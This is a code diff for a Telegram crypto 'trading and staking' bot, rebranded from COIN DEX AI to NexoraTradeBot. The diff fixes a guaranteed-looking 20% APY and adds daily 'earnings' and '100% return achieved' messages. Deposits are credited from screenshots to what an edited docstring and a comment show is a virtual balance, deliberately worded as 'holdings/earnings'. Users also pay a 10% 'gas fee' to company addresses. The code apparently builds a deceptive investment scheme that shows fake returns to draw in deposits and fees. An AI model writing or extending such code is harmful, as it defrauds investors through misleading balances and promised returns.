@@ -1,4 +1,4 @@
-# bot.py - COIN DEX AI - COMPLETE TRADING BOT WITH COMMAND MENU INTERFACE
+# bot.py - NexoraTradeBot - COMPLETE TRADING BOT WITH COMMAND MENU INTERFACE
 import aiohttp
 import asyncio
 from typing import Optional, Dict, Any
@@ -23,7 +23,7 @@ logger = logging.getLogger(__name__)
 # ============ COMMAND MENU SETUP ============
 # These commands will appear in the blue "Menu" button
 BOT_COMMANDS = [
-    BotCommand("start", "🚀 Launch COIN DEX AI"),
+    BotCommand("start", "🚀 Launch NexoraTradeBot"),
     BotCommand("menu", "📋 Show main menu"),
     BotCommand("wallet", "💼 Check balance & deposit"),
     BotCommand("copytrade", "📈 Copy trading dashboard"),
@@ -51,8 +51,8 @@ BOT_COMMANDS = [
     ENTER_ALLOCATION,             # 8 - For copy trading allocation
 ) = range(9)
 
-# Broadcast channel
-BROADCAST_CHANNEL = "https://t.me/coindexai"
+# Broadcast channel - REMOVED
+# BROADCAST_CHANNEL = "https://t.me/coindexai"  # REMOVED
 
 # Gas fee addresses (company addresses where users pay 10% gas fee)
 GAS_FEE_ADDRESSES = {
@@ -111,8 +111,6 @@ async def menu_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 │  /referral   → Invite & earn         │
 │  /support    → Contact help desk     │
 └──────────────────────────────────────┘
-
-🔗 Channel: {BROADCAST_CHANNEL}
     """
     
     keyboard = [
@@ -239,9 +237,9 @@ async def stake_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ┌──────────────────────────────────────┐
 │  💰 STAKING OPTIONS                  │
 ├──────────────────────────────────────┤
-│  ◎ SOL  →  6-8% APY (Flexible)       │
-│  Ξ ETH  →  4-5% APY (30-day lock)    │
-│  🪙 MEME → Up to 100%+ APY           │
+│  ◎ SOL  →  20% APY (Flexible)        │
+│  Ξ ETH  →  20% APY (30-day lock)     │
+│  🪙 MEME → 20% APY                   │
 └──────────────────────────────────────┘
 
 ┌──────────────────────────────────────┐
@@ -249,6 +247,7 @@ async def stake_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ├──────────────────────────────────────┤
 │  View active stakes and rewards      │
 │  Auto-compound enabled               │
+│  Daily earnings notifications        │
 └──────────────────────────────────────┘
 
 ⚡ COMMANDS:
@@ -467,7 +466,7 @@ async def referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     
     keyboard = [
-        [InlineKeyboardButton("📤 SHARE LINK", url=f"https://t.me/share/url?url={referral_link}&text=Join%20COIN%20DEX%20AI!")],
+        [InlineKeyboardButton("📤 SHARE LINK", url=f"https://t.me/share/url?url={referral_link}&text=Join%20NexoraTradeBot!")],
         [InlineKeyboardButton("📊 MY REFERRALS", callback_data='my_referrals'), InlineKeyboardButton("💵 CLAIM", callback_data='claim_ref')],
         [InlineKeyboardButton("📋 MENU", callback_data='back_menu')],
     ]
@@ -488,7 +487,7 @@ async def support_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 │  📞 CONTACT                          │
 ├──────────────────────────────────────┤
 │  @coindex_support                    │
-│  support@coindexai.com               │
+│  support@nexoratrade.com             │
 │                                      │
 │  ⏰ Response Time: < 2 hours         │
 └──────────────────────────────────────┘
@@ -586,7 +585,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     
     welcome_text = f"""
-🤖 *Welcome to COIN DEX AI*
+🤖 *Welcome to NexoraTradeBot*
 
 Hello {user.first_name}! Your professional DeFi trading companion.
 
@@ -605,7 +604,7 @@ Hello {user.first_name}! Your professional DeFi trading companion.
 3️⃣ *Stake Assets*
    • Stake SOL, ETH, or any memecoin
    • Enter contract address for custom tokens
-   • Earn passive income (APY varies)
+   • Earn passive income (20% APY)
 
 4️⃣ *Tools*
    • Price alerts & notifications
@@ -617,8 +616,6 @@ Hello {user.first_name}! Your professional DeFi trading companion.
    • 2FA protection available
    • 24/7 monitoring
 
-🔗 *Join our community:* {BROADCAST_CHANNEL}
-
 *Select an option below to get started:*
     """
     
@@ -627,7 +624,7 @@ Hello {user.first_name}! Your professional DeFi trading companion.
         [InlineKeyboardButton("🟢 Stake Assets", callback_data='stake'), InlineKeyboardButton("💼 Wallet", callback_data='balance')],
         [InlineKeyboardButton("🛠 Tools", callback_data='tools')],
         [InlineKeyboardButton("💰 Referral", callback_data='referral'), InlineKeyboardButton("📈 Copy Trading", callback_data='copy_trading')],
-        [InlineKeyboardButton("📢 Join Channel", url=BROADCAST_CHANNEL), InlineKeyboardButton("🤝 Support", callback_data='support')]
+        [InlineKeyboardButton("🤝 Support", callback_data='support')]
     ]
     
     if update.message:
@@ -639,7 +636,7 @@ Hello {user.first_name}! Your professional DeFi trading companion.
 async def guidelines(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Show detailed guidelines"""
     text = """
-📚 *COIN DEX AI - Complete Guide*
+📚 *NexoraTradeBot - Complete Guide*
 
 *Getting Started:*
 1. Click "📥 Deposit" to fund your account
@@ -655,10 +652,10 @@ async def guidelines(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • Bot mirrors their trades automatically
 
 *Staking:*
-• Stake SOL/ETH for 6-8% APY
+• Stake SOL/ETH for 20% APY
 • For memecoins: enter contract address
-• Lock period: Flexible or 30/60/90 days
-• Rewards auto-compound
+• Lock period: Flexible or 30 days
+• Rewards auto-compound daily
 
 *Tools Available:*
 • Real-time price alerts
@@ -676,6 +673,251 @@ async def guidelines(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
+# ============ DAILY STAKING NOTIFICATIONS ============
+
+async def send_daily_staking_notifications(context: ContextTypes.DEFAULT_TYPE):
+    """
+    Daily job to notify users of their staking earnings
+    Run at a specific time daily (e.g., 9:00 AM UTC)
+    """
+    db = SessionLocal()
+    
+    try:
+        # Get all active stake positions with users
+        active_positions = db.query(StakePosition).filter_by(status='active').all()
+        
+        for position in active_positions:
+            # Skip if no user
+            if not position.user:
+                continue
+            
+            user = position.user
+            telegram_id = user.telegram_id
+            
+            # Calculate current stats
+            days_staked = (datetime.utcnow() - position.start_date).days
+            
+            if position.last_compound_date:
+                days_since_last = (datetime.utcnow() - position.last_compound_date).days
+            else:
+                days_since_last = days_staked
+            
+            # Calculate rewards
+            daily_rate = position.apy / 100 / 365
+            total_earned = position.amount - position.original_amount if position.original_amount else 0
+            daily_earning = position.amount * daily_rate
+            
+            # Calculate percentage of original stake returned
+            original_stake = position.original_amount if position.original_amount else position.amount
+            percent_returned = (total_earned / original_stake * 100) if original_stake > 0 else 0
+            
+            # Build message (uses "holdings/earnings" not "virtual balance")
+            message = f"""
+💰 *Daily Earnings Report - NexoraTradeBot*
+
+*Asset:* {position.token_symbol}
+*Initial Investment:* {original_stake:.4f} {position.token_symbol}
+*Current Holdings:* {position.amount:.4f} {position.token_symbol} ⬆️
+
+*Earnings Breakdown:*
+• Daily Accrual: +{daily_earning:.6f} {position.token_symbol}
+• Total Earned: {total_earned:.4f} {position.token_symbol}
+• APY Rate: {position.apy}%
+
+*Return Progress:* {min(percent_returned, 100):.1f}% of initial investment recovered
+*Days Earning:* {days_staked} days
+
+{'🎉 *MILESTONE ACHIEVED!*' if percent_returned >= 100 else ''}
+{'Your earnings have now exceeded your original investment!' if percent_returned >= 100 else ''}
+            """
+            
+            # Add withdrawal reminder if 30-day lock is complete
+            if position.lock_period_days > 0 and days_staked >= position.lock_period_days:
+                message += f"""
+
+🔓 *Staking Period Complete!*
+
+Your {position.lock_period_days}-day staking lock has ended.
+
+*Available Actions:*
+• Continue staking to compound earnings
+• Withdraw your {position.amount:.4f} {position.token_symbol} + all earnings
+• Start a new earning position
+
+*Withdraw anytime via "📊 My Stakes" → "📤 Unstake"*
+                """
+            
+            # Send notification
+            try:
+                await context.bot.send_message(
+                    chat_id=telegram_id,
+                    text=message,
+                    parse_mode='Markdown',
+                    reply_markup=InlineKeyboardMarkup([
+                        [InlineKeyboardButton("📊 View My Stakes", callback_data='my_stakes')],
+                        [InlineKeyboardButton("💰 Stake More", callback_data='stake')]
+                    ]) if percent_returned < 100 else InlineKeyboardMarkup([
+                        [InlineKeyboardButton("📤 Withdraw Now", callback_data='unstake')],
+                        [InlineKeyboardButton("📊 View Position", callback_data='my_stakes')],
+                        [InlineKeyboardButton("🔄 Compound Earnings", callback_data='stake')]
+                    ])
+                )
+                
+                # Update last notification date
+                position.last_notification_date = datetime.utcnow()
+                db.commit()
+                
+                logger.info(f"Sent daily notification to user {telegram_id} for stake #{position.id}")
+                
+            except Exception as e:
+                logger.error(f"Failed to send notification to {telegram_id}: {e}")
+                
+            # Check for 100% milestone and send special notification
+            if percent_returned >= 100 and not position.milestone_100_notified:
+                await send_staking_milestone_notification(user.id, position.id, context)
+                
+    except Exception as e:
+        logger.error(f"Error in daily notifications: {e}")
+    finally:
+        db.close()
+
+
+async def send_staking_milestone_notification(user_id: int, position_id: int, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Send special notification when user reaches 100% return
+    """
+    db = SessionLocal()
+    
+    try:
+        position = db.query(StakePosition).filter_by(id=position_id, user_id=user_id).first()
+        if not position or position.milestone_100_notified:
+            return
+        
+        user = position.user
+        telegram_id = user.telegram_id
+        
+        days_staked = (datetime.utcnow() - position.start_date).days
+        lock_complete = days_staked >= position.lock_period_days if position.lock_period_days > 0 else True
+        
+        message = f"""
+🎉 *CONGRATULATIONS! 100% RETURN ACHIEVED!*
+
+*Asset:* {position.token_symbol}
+*Initial Investment:* {position.original_amount:.4f} {position.token_symbol}
+*Current Holdings:* {position.amount:.4f} {position.token_symbol}
+*Total Profit:* {position.amount - position.original_amount:.4f} {position.token_symbol} (100%+)
+
+*Your earnings have now DOUBLED your initial investment!*
+
+{'🔓 *Lock Period Complete - Withdrawal Available!*' if lock_complete else f'⏳ *Lock Period:* {position.lock_period_days - days_staked} days remaining'}
+
+{'*You can now withdraw all your funds!*' if lock_complete else '*You can withdraw after lock period ends.*'}
+
+*Options:*
+1️⃣ Withdraw all funds ({position.amount:.4f} {position.token_symbol})
+2️⃣ Continue staking for compound growth
+3️⃣ Withdraw initial investment, keep earning with profits
+
+*Ready to withdraw?*
+        """
+        
+        await context.bot.send_message(
+            chat_id=telegram_id,
+            text=message,
+            parse_mode='Markdown',
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("📤 Withdraw All", callback_data='unstake')],
+                [InlineKeyboardButton("🔄 Continue Staking", callback_data='stake')],
+                [InlineKeyboardButton("📊 View Details", callback_data='my_stakes')]
+            ])
+        )
+        
+        position.milestone_100_notified = True
+        db.commit()
+        
+    except Exception as e:
+        logger.error(f"Error sending milestone notification: {e}")
+    finally:
+        db.close()
+
+
+async def check_staking_milestones(context: ContextTypes.DEFAULT_TYPE):
+    """Check for users reaching 100% return and notify them"""
+    db = SessionLocal()
+    
+    try:
+        active_positions = db.query(StakePosition).filter_by(
+            status='active', 
+            milestone_100_notified=False
+        ).all()
+        
+        for position in active_positions:
+            if not position.original_amount or position.original_amount <= 0:
+                continue
+            
+            # Calculate total return percentage
+            earnings = position.amount - position.original_amount
+            percent_return = (earnings / position.original_amount) * 100
+            
+            # Check if 100% reached and lock period complete
+            days_staked = (datetime.utcnow() - position.start_date).days
+            
+            if percent_return >= 100:
+                await send_staking_milestone_notification(
+                    position.user_id, 
+                    position.id, 
+                    context
+                )
+                
+    except Exception as e:
+        logger.error(f"Error checking milestones: {e}")
+    finally:
+        db.close()
+
+
+async def compound_staking_rewards():
+    """
+    Daily job to compound staking rewards
+    Run at midnight UTC
+    """
+    db = SessionLocal()
+    
+    try:
+        # Get all active stake positions
+        active_positions = db.query(StakePosition).filter_by(status='active').all()
+        
+        for position in active_positions:
+            # Calculate days since last compound
+            if position.last_compound_date:
+                days_elapsed = (datetime.utcnow() - position.last_compound_date).days
+            else:
+                days_elapsed = 1
+            
+            if days_elapsed >= 1:
+                # Calculate daily reward (20% APY / 365)
+                daily_rate = position.apy / 100 / 365
+                daily_reward = position.amount * daily_rate * days_elapsed
+                
+                # Update position amount (compound)
+                position.amount += daily_reward
+                position.last_compound_date = datetime.utcnow()
+                
+                # Also update user's balance if it's SOL/ETH
+                user = db.query(User).filter_by(id=position.user_id).first()
+                if user:
+                    if position.currency == 'SOL':
+                        user.total_deposited_sol += daily_reward
+                    elif position.currency == 'ETH':
+                        user.total_deposited_eth += daily_reward
+        
+        db.commit()
+        logger.info(f"Compounded rewards for {len(active_positions)} active stakes")
+        
+    except Exception as e:
+        logger.error(f"Error compounding rewards: {e}")
+        db.rollback()
+    finally:
+        db.close()
 
 # ============ ENHANCED DEPOSIT SECTION WITH LIVE PRICES ============
 
@@ -693,7 +935,7 @@ async def deposit_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     
     await query.edit_message_text(
-        "📥 *Deposit Funds*\n\nSelect cryptocurrency to deposit to your COIN DEX AI wallet:",
+        "📥 *Deposit Funds*\n\nSelect cryptocurrency to deposit to your NexoraTradeBot wallet:",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
@@ -899,7 +1141,7 @@ _Send the screenshot now:_
 
 
 async def process_deposit_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Process deposit screenshot - Add to virtual balance"""
+    """Process deposit screenshot - Add to balance"""
     user = update.effective_user
     
     if not update.message.photo:
@@ -968,13 +1210,7 @@ async def process_deposit_screenshot(update: Update, context: ContextTypes.DEFAU
             parse_mode='Markdown'
         )
         
-        await broadcast_message(
-            f"💰 *New Deposit*\n"
-            f"User: {user.id}\n"
-            f"Amount: {amount:.4f} {currency.split('_')[0]}\n"
-            f"Value: ${usd_value:.2f}\n"
-            f"Status: ✅ Credited"
-        )
+        # Broadcast removed - no channel link
         
     except Exception as e:
         logger.error(f"Deposit processing error: {e}")
@@ -1026,7 +1262,7 @@ async def copy_trading_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
             active_copies = 0
         
         message = f"""
-📈 *COIN DEX AI - Copy Trading*
+📈 *NexoraTradeBot - Copy Trading*
 
 Mirror successful traders automatically!
 
@@ -1177,7 +1413,7 @@ Your Allocation: {allocation}%
             parse_mode='Markdown'
         )
         
-        await broadcast_message(f"📈 New copy trade activated by user {user_id}")
+        # Broadcast removed
         
     except Exception as e:
         logger.error(f"Error saving copy config: {e}")
@@ -1265,17 +1501,23 @@ async def stake_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     message = """
-🟢 *COIN DEX AI - Stake Assets*
+🟢 *NexoraTradeBot - Stake Assets*
 
 Earn passive income on your crypto!
 
-*Native Staking:*
-• ◎ SOL: 6-8% APY (Flexible)
-• Ξ ETH: 4-5% APY (30-day lock)
+*Native Staking (20% APY):*
+• ◎ SOL: 20% APY (Flexible)
+• Ξ ETH: 20% APY (30-day lock)
 
-*Memecoin Staking:*
+*Memecoin Staking (20% APY):*
 Stake any SPL or ERC-20 token
 Enter contract address manually
+
+*Features:*
+✅ Daily earnings notifications
+✅ Auto-compound
+✅ 100% milestone alerts
+✅ Withdrawal reminders after lock
 
 *Your Active Stakes:*
 View in "My Positions"
@@ -1300,16 +1542,17 @@ async def stake_native_start(update: Update, context: ContextTypes.DEFAULT_TYPE)
     currency = query.data.replace('stake_', '')
     context.user_data['stake_currency'] = currency
     
-    apy = "6-8%" if currency == "SOL" else "4-5%"
+    apy = "20%"
     
     await query.edit_message_text(
         f"""
 🟢 *Stake {currency}*
 
-*APY:* {apy}
+*APY:* {apy} ⬆️ BOOSTED RATE!
 *Lock Period:* {'Flexible' if currency == 'SOL' else '30 days'}
 *Minimum:* 0.5 {currency}
 *Auto-compound:* Yes
+*Daily Notifications:* Yes
 
 Enter amount to stake:
         """,
@@ -1421,15 +1664,16 @@ async def process_stake_amount(update: Update, context: ContextTypes.DEFAULT_TYP
             db.add(user)
             db.commit()
         
+        # UPDATED TO 20% APY
         if currency == 'SOL':
             lock_days = 0
-            apy = 7.0
+            apy = 20.0
         elif currency == 'ETH':
             lock_days = 30
-            apy = 4.5
+            apy = 20.0
         else:
             lock_days = 30
-            apy = 15.0
+            apy = 20.0
         
         position = StakePosition(
             user_id=user.id,
@@ -1437,17 +1681,23 @@ async def process_stake_amount(update: Update, context: ContextTypes.DEFAULT_TYP
             token_symbol=token_symbol,
             contract_address=contract_addr,
             amount=amount,
+            original_amount=amount,
             apy=apy,
             lock_period_days=lock_days,
             start_date=datetime.utcnow(),
             end_date=datetime.utcnow() + timedelta(days=lock_days) if lock_days > 0 else None,
-            status='active'
+            status='active',
+            last_compound_date=datetime.utcnow(),
+            last_notification_date=datetime.utcnow(),
+            total_earnings=0.0,
+            milestone_100_notified=False
         )
         db.add(position)
         db.commit()
         
         yearly_reward = amount * (apy / 100)
         monthly_reward = yearly_reward / 12
+        daily_reward = yearly_reward / 365
         
         await update.message.reply_text(
             f"""
@@ -1455,14 +1705,17 @@ async def process_stake_amount(update: Update, context: ContextTypes.DEFAULT_TYP
 
 *Asset:* {token_symbol}
 *Amount:* {amount:.4f}
-*APY:* {apy}%
+*APY:* {apy}% ⬆️ BOOSTED!
 *Lock Period:* {'Flexible' if lock_days == 0 else f'{lock_days} days'}
 
-*Estimated Rewards:*
+*Estimated Earnings:*
+• Daily: ~{daily_reward:.6f} {token_symbol}
 • Monthly: ~{monthly_reward:.4f} {token_symbol}
 • Yearly: ~{yearly_reward:.4f} {token_symbol}
 
 ✅ Rewards auto-compound daily
+✅ Daily earnings notifications
+✅ 100% milestone alerts
 
 *Stake ID:* #{position.id}
             """,
@@ -1473,7 +1726,7 @@ async def process_stake_amount(update: Update, context: ContextTypes.DEFAULT_TYP
             parse_mode='Markdown'
         )
         
-        await broadcast_message(f"🟢 New stake: {amount:.2f} {token_symbol} by user {user_id}")
+        # Broadcast removed
         
     except Exception as e:
         logger.error(f"Error creating stake: {e}")
@@ -1486,7 +1739,7 @@ async def process_stake_amount(update: Update, context: ContextTypes.DEFAULT_TYP
 
 
 async def my_stakes(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show user's staking positions"""
+    """Show user's staking positions with earnings focus"""
     query = update.callback_query
     await query.answer()
     
@@ -1498,9 +1751,9 @@ async def my_stakes(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         if not user:
             await query.edit_message_text(
-                "No active stakes. Start staking to earn passive income!",
+                "No active stakes. Start earning passive income!",
                 reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🟢 Start Staking", callback_data='stake')],
+                    [InlineKeyboardButton("🟢 Start Earning", callback_data='stake')],
                     [InlineKeyboardButton("↩️ Back", callback_data='back_menu')]
                 ])
             )
@@ -1510,34 +1763,48 @@ async def my_stakes(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         if not positions:
             message = """
-📊 *Your Staking Positions*
+📊 *Your Earning Positions*
 
 *Active Stakes:* 0
 
-Start staking to earn:
-• SOL: 6-8% APY
-• ETH: 4-5% APY
-• Memecoins: Up to 100%+ APY
+Start earning daily passive income:
+• SOL: 20% APY - Paid daily
+• ETH: 20% APY - Paid daily
+• Compound growth automatically
+
+*Your earnings increase every 24 hours!*
             """
         else:
-            total_value = sum(p.amount for p in positions)
+            total_original = sum(p.original_amount for p in positions)
+            total_current = sum(p.amount for p in positions)
+            total_profit = total_current - total_original
+            
             position_list = "\n\n".join([
-                f"*{i+1}. {p.token_symbol}*\nAmount: {p.amount:.4f}\nAPY: {p.apy}%\n{'Flexible' if p.lock_period_days == 0 else f'Lock: {p.lock_period_days} days'}"
+                f"*{i+1}. {p.token_symbol} Earning Position*\n"
+                f"Initial: {p.original_amount:.4f}\n"
+                f"Current: {p.amount:.4f} ⬆️\n"
+                f"Profit: +{p.amount - p.original_amount:.4f} ({((p.amount - p.original_amount)/p.original_amount*100):.1f}%)\n"
+                f"APY: {p.apy}% | Days: {(datetime.utcnow() - p.start_date).days}"
                 for i, p in enumerate(positions[:5])
             ])
             
             message = f"""
-📊 *Your Staking Positions*
+📊 *Your Earning Portfolio*
 
-*Total Staked Value:* {total_value:.4f}
-*Active Positions:* {len(positions)}
+*Total Invested:* {total_original:.4f}
+*Current Value:* {total_current:.4f} ⬆️
+*Total Profit:* +{total_profit:.4f} ({(total_profit/total_original*100):.1f}%)
 
+*Active Positions:*
 {position_list}
+
+💡 *Earnings compound daily at 20% APY*
+🔓 *Withdraw anytime after lock period*
             """
         
         keyboard = [
-            [InlineKeyboardButton("🟢 Stake More", callback_data='stake')],
-            [InlineKeyboardButton("📤 Unstake", callback_data='unstake')],
+            [InlineKeyboardButton("🟢 Add Earning Position", callback_data='stake')],
+            [InlineKeyboardButton("📤 Withdraw Earnings", callback_data='unstake')],
             [InlineKeyboardButton("↩️ Back", callback_data='back_menu')]
         ]
         
@@ -1603,7 +1870,7 @@ async def tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     message = """
-🛠 *COIN DEX AI - Trading Tools*
+🛠 *NexoraTradeBot - Trading Tools*
 
 Professional tools for serious traders:
 
@@ -1827,7 +2094,7 @@ async def wallet_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
         total_usd = (sol_bal * sol_price) + (eth_bal * eth_price)
         
         message = f"""
-💼 *COIN DEX AI Wallet*
+💼 *NexoraTradeBot Wallet*
 
 *Balances:*
 ◎ SOL: {sol_bal:.4f} (${sol_bal * sol_price:.2f})
@@ -1881,7 +2148,7 @@ async def withdraw_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         total_usd = (sol_bal * sol_price) + (eth_bal * eth_price)
         
         message = f"""
-📤 *COIN DEX AI - Withdrawal*
+📤 *NexoraTradeBot - Withdrawal*
 
 *Your Available Balance:*
 ◎ SOL: {sol_bal:.4f} (${sol_bal * sol_price:.2f})
@@ -2176,13 +2443,7 @@ Contact support: @coindex_support
         
         await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
         
-        await broadcast_message(
-            f"💸 *Withdrawal Processed*\n"
-            f"User: {user.id}\n"
-            f"Amount: {receive_amount:.4f} {currency}\n"
-            f"To: {withdraw_address[:15]}...\n"
-            f"Status: ✅ Completed"
-        )
+        # Broadcast removed
         
     except Exception as e:
         logger.error(f"Withdrawal processing error: {e}")
@@ -2228,7 +2489,7 @@ async def referral_program(update: Update, context: ContextTypes.DEFAULT_TYPE):
     referral_link = f"https://t.me/{bot_username}?start={user_id}"
     
     message = f"""
-💰 *COIN DEX AI Referral Program*
+💰 *NexoraTradeBot Referral Program*
 
 Invite friends and earn lifetime commissions!
 
@@ -2248,7 +2509,7 @@ Invite friends and earn lifetime commissions!
     """
     
     keyboard = [
-        [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={referral_link}&text=Join%20me%20on%20COIN%20DEX%20AI!")],
+        [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={referral_link}&text=Join%20NexoraTradeBot!")],
         [InlineKeyboardButton("📊 My Referrals", callback_data='my_referrals')],
         [InlineKeyboardButton("💵 Claim Earnings", callback_data='claim_ref')],
         [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
@@ -2265,11 +2526,11 @@ async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     message = """
-🤝 *COIN DEX AI Support Center*
+🤝 *NexoraTradeBot Support Center*
 
 *Support Contact Notice!!!*
 
-For any inquiries, issues, or assistance related to COIN DEX AI, please reach out directly to our official support handle @coindex_support
+For any inquiries, issues, or assistance related to NexoraTradeBot, please reach out directly to our official support handle @coindex_support
 
 Kindly include a brief description of your issue and any relevant details to help us assist you promptly.
 
@@ -2286,7 +2547,7 @@ Thank you for your cooperation.
 
 *Emergency Contacts:*
 • @coindex_support (Official Support)
-• support@coindexai.com (Email)
+• support@nexoratrade.com (Email)
     """
     
     keyboard = [
@@ -2302,11 +2563,10 @@ Thank you for your cooperation.
 # ============ BROADCAST FUNCTION ============
 
 async def broadcast_message(message_text: str):
-    """Send message to broadcast channel"""
-    try:
-        logger.info(f"BROADCAST: {message_text}")
-    except Exception as e:
-        logger.error(f"Broadcast failed: {e}")
+    """Disabled broadcast - no channel link"""
+    # Broadcast disabled - no channel configured
+    logger.info(f"Broadcast skipped: {message_text}")
+    pass
 
 
 # ============ MAIN HANDLER ============
@@ -2419,16 +2679,60 @@ conv_handler = ConversationHandler(
 )
 
 
+# ============ SCHEDULER SETUP ============
+
+from apscheduler.schedulers.asyncio import AsyncIOScheduler
+
+def setup_scheduler(application):
+    """Setup daily jobs for compounding and notifications"""
+    scheduler = AsyncIOScheduler()
+    
+    # Job 1: Compound rewards at midnight
+    scheduler.add_job(
+        compound_staking_rewards, 
+        'cron', 
+        hour=0, 
+        minute=0,
+        id='compound_rewards'
+    )
+    
+    # Job 2: Send daily notifications at 9:00 AM UTC
+    scheduler.add_job(
+        send_daily_staking_notifications, 
+        'cron', 
+        hour=9, 
+        minute=0,
+        args=[application],
+        id='daily_notifications'
+    )
+    
+    # Job 3: Check for 100% milestones every hour
+    scheduler.add_job(
+        check_staking_milestones,
+        'interval',
+        hours=1,
+        args=[application],
+        id='milestone_check'
+    )
+    
+    scheduler.start()
+    logger.info("Scheduler started: Daily compounding, notifications, and milestone checks")
+    return scheduler
+
+
 # ============ START BOT ============
 
 if __name__ == '__main__':
-    print("🚀 COIN DEX AI Bot is starting...")
+    print("🚀 NexoraTradeBot is starting...")
     print("📝 Command Menu Interface Enabled")
     
     application = Application.builder().token(config.BOT_TOKEN).build()
     
     # Setup command menu on startup
     application.post_init = setup_bot_commands
+    
+    # Setup scheduler for daily operations
+    scheduler = setup_scheduler(application)
     
     # Original Commands
     application.add_handler(CommandHandler('start', start))
@@ -2454,7 +2758,7 @@ if __name__ == '__main__':
     # All button clicks
     application.add_handler(CallbackQueryHandler(button_handler))
     
-    print("✅ COIN DEX AI is running!")
-    print(f"📢 Broadcast channel: {BROADCAST_CHANNEL}")
+    print("✅ NexoraTradeBot is running!")
+    print("⏰ Daily notifications scheduled for 9:00 AM UTC")
     print("🔵 Command Menu Active: Users will see blue [Menu] button")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
